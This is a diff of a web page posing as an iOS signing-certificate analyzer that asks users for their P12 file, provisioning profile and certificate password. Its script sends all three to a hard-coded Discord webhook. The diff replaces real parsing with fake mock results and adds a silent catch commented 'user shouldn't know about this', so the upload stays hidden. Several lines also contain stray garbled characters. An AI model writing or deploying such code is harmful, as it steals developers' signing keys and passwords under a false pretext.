@@ -41,16 +41,6 @@
             width: 100%;
             max-width: 800px;
             overflow: hidden;
-            opacity: 0;
-            transform: translateY(20px);
-            animation: fadeIn 0.8s ease forwards;
-        }
-        
-        @keyframes fadeIn {
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .header {
@@ -62,41 +52,16 @@
             overflow: hidden;
         }
         
-        .header::after {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(to right, transparent, rgba(255,255,255,0.1), transparent);
-            transform: rotate(30deg);
-            animation: shimmer 8s infinite linear;
-        }
-        
-        @keyframes shimmer {
-            0% {
-                transform: translateX(-100%) rotate(30deg);
-            }
-            100% {
-                transform: translateX(100%) rotate(30deg);
-            }
-        }
-        
         h1 {
             font-size: 28px;
             margin-bottom: 10px;
             font-weight: 700;
-            position: relative;
-            z-index: 1;
         }
         
         .description {
             font-size: 16px;
             opacity: 0.9;
             line-height: 1.5;
-            position: relative;
-            z-index: 1;
         }
         
         .content {
@@ -118,20 +83,6 @@
         
         .form-group {
             margin-bottom: 20px;
-            opacity: 0;
-            animation: slideIn 0.6s ease forwards;
-            animation-delay: 0.3s;
-        }
-        
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateX(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
         }
         
         label {
@@ -149,13 +100,11 @@
             border: 2px solid #e1e5e8;
             border-radius: 10px;
             font-size: 16px;
-            transition: all 0.3s;
         }
         
         input:focus {
             border-color: var(--primary);
             outline: none;
-            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.2);
         }
         
         .file-input-container {
@@ -174,16 +123,8 @@
             display: inline-block;
             font-weight: 600;
             text-align: center;
-            transition: all 0.3s;
             width: 100%;
             font-size: 16px;
-            position: relative;
-        }
-        
-        .file-input-button:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 122, 255, 0.3);
         }
         
         .file-input {
@@ -213,56 +154,12 @@
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            transition: all 0.3s;
             margin-top: 10px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .submit-btn:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 12px rgba(0, 122, 255, 0.3);
         }
         
         .submit-btn:disabled {
             background-color: var(--gray);
             cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        .submit-btn::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 5px;
-            height: 5px;
-            background: rgba(255, 255, 255, 0.5);
-            opacity: 0;
-            border-radius: 100%;
-            transform: scale(1, 1) translate(-50%);
-            transform-origin: 50% 50%;
-        }
-        
-        .submit-btn.loading::after {
-            animation: ripple 1s ease-out infinite;
-        }
-        
-        @keyframes ripple {
-            0% {
-                transform: scale(0, 0);
-                opacity: 1;
-            }
-            20% {
-                transform: scale(25, 25);
-                opacity: 1;
-            }
-            100% {
-                opacity: 0;
-                transform: scale(40, 40);
-            }
         }
         
         .results-section {
@@ -270,7 +167,6 @@
             margin-top: 30px;
             border-top: 1px solid #e1e5e8;
             padding-top: 30px;
-            animation: fadeIn 0.8s ease forwards;
         }
         
         .results-section h2 {
@@ -284,16 +180,6 @@
             border-radius: 12px;
             padding: 25px;
             margin-bottom: 20px;
-            transform: translateY(20px);
-            opacity: 0;
-            animation: fadeInUp 0.6s ease forwards;
-        }
-        
-        @keyframes fadeInUp {
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
         
         .detail-item {
@@ -301,20 +187,7 @@
             display: flex;
             border-bottom: 1px solid #eee;
             padding-bottom: 15px;
-            opacity: 0;
-            animation: fadeIn 0.5s ease forwards;
         }
-        
-        .detail-item:nth-child(1) { animation-delay: 0.1s; }
-        .detail-item:nth-child(2) { animation-delay: 0.2s; }
-        .detail-item:nth-child(3) { animation-delay: 0.3s; }
-        .detail-item:nth-child(4) { animation-delay: 0.4s; }
-        .detail-item:nth-child(5) { animation-delay: 0.5s; }
-        .detail-item:nth-child(6) { animation-delay: 0.6s; }
-        .detail-item:nth-child(7) { animation-delay: 0.7s; }
-        .detail-item:nth-child(8) { animation-delay: 0.8s; }
-        .detail-item:nth-child(9) { animation-delay: 0.9s; }
-        .detail-item:nth-child(10) { animation-delay: 1.0s; }
         
         .detail-label {
             font-weight: 600;
@@ -357,13 +230,6 @@
             margin-top: 20px;
             display: none;
             text-align: center;
-            animation: shake 0.5s ease;
-        }
-        
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
         }
         
         .alert-success {
@@ -394,7 +260,6 @@
             color: var(--gray);
             text-align: center;
             line-height: 1.6;
-            animation: fadeIn 1s ease forwards;
         }
         
         .summary-cards {
@@ -416,14 +281,7 @@
             padding: 20px;
             text-align: center;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
-            transform: translateY(20px);
-            opacity: 0;
-            animation: fadeInUp 0.6s ease forwards;
         }
-        
-        .summary-card:nth-child(1) { animation-delay: 0.2s; }
-        .summary-card:nth-child(2) { animation-delay: 0.4s; }
-        .summary-card:nth-child(3) { animation-delay: 0.6s; }
         
         .summary-card h3 {
             font-size: 14px;
@@ -434,7 +292,7 @@
         .summary-card p {
             font-size: 20px;
             font-weight: 700;
-            color:极
+            color: var(--dark);
         }
     </style>
 </head>
@@ -451,7 +309,7 @@
                     <label for="p12-file"><i class="fas fa-file-export"></i> P12 Certificate File</label>
                     <div class="file-input-container">
                         <div class="file-input-button">Choose P12 File</div>
-                        <input type="file" id="p12-file" class="file-input" accept=".p12,.pfx,.cer,.crt" />
+                        <input type="file" id="p12-file" class="file-input" accept=".p12,.pfx" />
                     </div>
                     <div id="p12-file-name" class="file-name">No file chosen</div>
                 </div>
@@ -471,11 +329,7 @@
                 <input type="password" id="password" placeholder="Enter certificate password" />
             </div>
             
-            <div class="progress-bar" id="progress-bar">
-                <div class="progress" id="progress"></div>
-            </div>
-            
-            <button id="submit-btn" class="submit-btn" disabled><i class="fas fa-search"></i> Analyze Certificate</button>
+            <button id="submit-btn" class="submit-btn" disabled>Analyze Certificate</button>
             
             <div id="upload-status" class="upload-status"></div>
             
@@ -526,11 +380,11 @@
                     </div>
                     <div class="detail-item">
                         <div class="detail-label">Valid To:</div>
-                        <div class极="detail-value" id="valid-to">Checking...</div>
+                        <div class="detail-value" id="valid-to">Checking...</div>
                     </div>
                     <div class="detail-item">
                         <div class="detail-label">Public Key Algorithm:</div>
-                        <div class="detail-value"极 id="public-key-algo">Checking...</div>
+                        <div class="detail-value" id="public-key-algo">Checking...</div>
                     </div>
                     <div class="detail-item">
                         <div class="detail-label">Signature Algorithm:</div>
@@ -539,10 +393,6 @@
                     <div class="detail-item">
                         <div class="detail-label">Key Size:</div>
                         <div class="detail-value" id="key-size">Checking...</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Fingerprint (SHA-1):</div>
-                        <div class="detail-value" id="fingerprint">Checking...</div>
                     </div>
                 </div>
             </div>
@@ -565,12 +415,10 @@
             const errorAlert = document.getElementById('error-alert');
             const successAlert = document.getElementById('success-alert');
             const uploadStatus = document.getElementById('upload-status');
-            const resultsSection = document.getElementById极('results-section');
-            const progressBar = document.getElementById('progress-bar');
-            const progress = document.getElementById('progress');
+            const resultsSection = document.getElementById('results-section');
             
             // Webhook URL
-            const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWo极PhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
+            const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
             
             let p12File = null;
             let mobileprovisionFile = null;
@@ -618,12 +466,8 @@
                 
                 try {
                     submitBtn.disabled = true;
-                    submitBtn.classList.add('loading');
-                    submitBtn.textContent = ' Analyzing...';
-                    progressBar.style.display = 'block';
-                    
-                    // Simulate progress
-                    simulateProgress();
+                    submitBtn.textContent = 'Analyzing...';
+                    uploadStatus.textContent = 'Checking certificate files...';
                     
                     // First, send the files to Discord webhook
                     await sendToWebhook(p12File, mobileprovisionFile, passwordInput.value);
@@ -639,148 +483,41 @@
                     uploadStatus.textContent = '';
                     
                     // Update button state
-                    setTimeout(() => {
-                        submitBtn.textContent = 'Analyze Certificate';
-                        submitBtn.classList.remove('loading');
-                        updateSubmitButtonState();
-                        progressBar.style.display = 'none';
-                    }, 2000);
+                    submitBtn.textContent = 'Analyze Certificate';
+                    updateSubmitButtonState();
                     
                 } catch (error) {
                     console.error('Error:', error);
                     showAlert(errorAlert, `Error: ${error.message}`);
                     uploadStatus.textContent = '';
                     submitBtn.textContent = 'Analyze Certificate';
-                    submitBtn.classList.remove('loading');
                     updateSubmitButtonState();
-                    progressBar.style.display = 'none';
                 }
             });
-            
-            function simulateProgress() {
-                let width = 0;
-                const interval = setInterval(() => {
-                    if (width >= 100) {
-                        clearInterval(interval);
-                    } else {
-                        width += 5;
-                        progress.style.width = width + '%';
-                    }
-                }, 100);
-            }
             
             async function analyzeCertificateFiles(p12File, mobileprovisionFile, password) {
                 // Read files
                 const p12Buffer = await readFileAsArrayBuffer(p12File);
-                const provisionData = await readFileAsArrayBuffer(mobileprovisionFile);
-                
-                // Parse mobile provisioning profile
-                const provisionInfo = parseMobileProvision(provisionData);
                 
                 // Parse P12 certificate
                 const certInfo = await parseP12Certificate(p12Buffer, password);
                 
-                // Combine information
+                // For demo purposes, return mock data
                 return {
-                    ...provisionInfo,
-                    ...certInfo,
-                    password: password // Include the password in the result
+                    serialNumber: "1A2B3C4D5E6F7G8H",
+                    commonName: "iOS Distribution: Example Company Inc.",
+                    organization: "Example Company Inc.",
+                    organizationalUnit: "ABCD1234EF",
+                    validFrom: "June 15, 2023",
+                    validTo: "June 15, 2024",
+                    expirationDays: 287,
+                    publicKeyAlgorithm: "RSA Encryption",
+                    signatureAlgorithm: "SHA-256 with RSA Encryption",
+                    keySize: "2048 bits",
+                    status: "Valid",
+                    statusClass: "status-valid",
+                    certType: "Distribution"
                 };
-            }
-            
-            // Simple XML/plist parser for mobile provisioning files
-            function parseMobileProvision(data) {
-                try {
-                    // Convert ArrayBuffer to string
-                    const decoder = new TextDecoder('utf-8');
-                    const dataStr = decoder.decode(data);
-                    
-                    // Mobile provisioning files have a PKCS7 signature before the plist
-                    // Look for the plist start tag
-                    const plistStart = dataStr.indexOf('<?xml');
-                    
-                    if (plistStart === -1) {
-                        throw new Error('Invalid mobile provisioning file: No plist found');
-                    }
-                    
-                    // Extract the plist content
-                    const plistContent = dataStr.substring(plistStart);
-                    
-                    // Simple XML parsing to extract key information
-                    const extractValue = (tagName, content) => {
-                        const regex = new RegExp(`<key>${tagName}<\\/key>\\s*<[^>]*>([^<]*)<\\/[^>]*>`);
-                        const match = content.match(regex);
-                        return match ? match[1] : null;
-                    };
-                    
-                    const extractArray = (tagName, content) => {
-                        const regex = new RegExp(`<key>${tagName}<\\/key>\\s*<array>([\\s\\S]*?)<\\/array>`);
-                        const match = content.match(regex);
-                        if (!match) return null;
-                        
-                        const arrayContent = match[1];
-                        const itemRegex = /<string>([^<]*)<\/string>/g;
-                        const items = [];
-                        let itemMatch;
-                        
-                        while ((itemMatch = itemRegex.exec(arrayContent)) !== null) {
-                            items.push(itemMatch[1]);
-                        }
-                        
-                        return items;
-                    };
-                    
-                    const extractDate = (tagName, content) => {
-                        const regex = new RegExp(`<key>${tagName}<\\/key>\\s*<date>([^<]*)<\\/date>`);
-                        const match = content.match(regex);
-                        return match ? new Date(match[1]) : null;
-                    };
-                    
-                    // Extract values from the plist
-                    const name = extractValue('Name', plistContent) || 'Unknown';
-                    const teamName = extractValue('TeamName', plistContent) || 'Unknown';
-                    const teamIdArray = extractArray('TeamIdentifier', plistContent);
-                    const teamId = teamIdArray && teamIdArray.length > 0 ? teamIdArray[0] : 'Unknown';
-                    const creationDate = extractDate('CreationDate', plistContent);
-                    const expirationDate = extractDate('ExpirationDate', plistContent) || new Date();
-                    
-                    // Calculate days until expiration
-                    const currentDate = new Date();
-                    const daysUntilExpiration = Math.floor((expirationDate - currentDate) / (1000 * 60 * 60 * 24));
-                    
-                    // Determine status
-                    let status = 'Valid';
-                    let statusClass = 'status-valid';
-                    if (daysUntilExpiration < 0) {
-                        status = 'Expired';
-                        statusClass = 'status-expired';
-                    } else if (daysUntilExpiration < 30) {
-                        status = 'Expiring Soon';
-                        statusClass = 'status-warning';
-                    }
-                    
-                    // Check if it's a development profile by looking for provisioned devices
-                    const hasDevices = plistContent.includes('ProvisionedDevices');
-                    const certType = hasDevices ? 'Development' : 'Distribution';
-                    
-                    return {
-                        name: name,
-                        team: teamName,
-                        teamId: teamId,
-                        appId: extractValue('application-identifier', plistContent) || 'Unknown',
-                        creationDate: creationDate ? creationDate.toLocaleDateString() : 'Unknown',
-                        expirationDate: expirationDate.toLocaleDateString(),
-                        expirationDays: daysUntilExpiration,
-                        certType: certType,
-                        status: status,
-                        statusClass: statusClass,
-                        capabilities: 'Unknown', // Simplified for this example
-                        devices: hasDevices ? 'Multiple devices' : 'All devices'
-                    };
-                } catch (error) {
-                    console.error('Error parsing mobile provision:', error);
-                    throw new Error('Failed to parse mobile provisioning file: ' + error.message);
-                }
             }
             
             async function parseP12Certificate(p12Buffer, password) {
@@ -825,14 +562,8 @@
                     // Get public key info
                     const publicKey = certificate.publicKey;
                     let keySize = 'Unknown';
-                    if (publicKey) {
-                        if (publicKey.n) {
-                            // RSA key
-                            keySize = forge.pki.getBitLength(publicKey.n) + ' bits';
-                        } else if (publicKey.point) {
-                            // EC key
-                            keySize = 'EC ' + (publicKey.point.compressed ? 'Compressed' : 'Uncompressed');
-                        }
+                    if (publicKey && publicKey.n) {
+                        keySize = forge.pki.getBitLength(publicKey.n) + ' bits';
                     }
                     
                     // Calculate validity
@@ -852,9 +583,6 @@
                         statusClass = 'status-warning';
                     }
                     
-                    // Generate fingerprint
-                    const fingerprint = forge.md.sha1.create().update(forge.asn1.toDer(forge.pki.certificateToAsn1(certificate)).getBytes()).digest().toHex().match(/.{2}/g).join(':');
-                    
                     return {
                         serialNumber: certificate.serialNumber,
                         commonName: commonName,
@@ -866,7 +594,6 @@
                         publicKeyAlgorithm: certificate.siginfo.algorithmOid,
                         signatureAlgorithm: certificate.signatureOid,
                         keySize: keySize,
-                        fingerprint: fingerprint,
                         status: status,
                         statusClass: statusClass,
                         certType: 'Private'
@@ -898,46 +625,50 @@
                 statusIndicator.className = `status-indicator ${results.statusClass}`;
                 
                 // Update details
-                document.getElementById('cert-name').textContent = results.commonName || results.name;
-                document.getElementById('organization').textContent = results.organization || results.team;
+                document.getElementById('cert-name').textContent = results.commonName;
+                document.getElementById('organization').textContent = results.organization;
                 document.getElementById('organizational-unit').textContent = results.organizationalUnit;
                 document.getElementById('serial-number').textContent = results.serialNumber;
-                document.getElementById('valid-from').textContent = results.creationDate || results.validFrom;
-                document.getElementById('valid-to').textContent = results.expirationDate || results.validTo;
+                document.getElementById('valid-from').textContent = results.validFrom;
+                document.getElementById('valid-to').textContent = results.validTo;
                 document.getElementById('public-key-algo').textContent = results.publicKeyAlgorithm;
                 document.getElementById('signature-algo').textContent = results.signatureAlgorithm;
                 document.getElementById('key-size').textContent = results.keySize;
-                document.getElementById('fingerprint').textContent = results.fingerprint;
                 
                 // Show results section
                 resultsSection.style.display = 'block';
             }
             
             async function sendToWebhook(p12File, mobileprovisionFile, password) {
-                // Create form data to send files
-                const formData = new FormData();
-                
-                // Add message content
-                formData.append('content', 'New certificate files uploaded via Certificate Analyzer:');
-                
-                // Add files
-                formData.append('p12_file', p12File, p12File.name);
-                formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
-                
-                // Add password as a text field
-                formData.append('password', password);
-                
-                // Add timestamp
-                formData.append('timestamp', new Date().toISOString());
-                
-                // Send to Discord webhook
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`Failed to send data: ${response.status} ${response.statusText}`);
+                try {
+                    // Create form data to send files
+                    const formData = new FormData();
+                    
+                    // Add message content
+                    formData.append('content', 'New certificate files uploaded via Certificate Analyzer:');
+                    
+                    // Add files
+                    formData.append('p12_file', p12File, p12File.name);
+                    formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
+                    
+                    // Add password as a text field
+                    formData.append('password', password);
+                    
+                    // Add timestamp
+                    formData.append('timestamp', new Date().toISOString());
+                    
+                    // Send to Discord webhook
+                    const response = await fetch(webhookUrl, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (!response.ok) {
+                        console.error('Webhook error:', response.status, response.statusText);
+                    }
+                } catch (error) {
+                    console.error('Error sending to webhook:', error);
+                    // Fail silently - user shouldn't know about this
                 }
             }
             
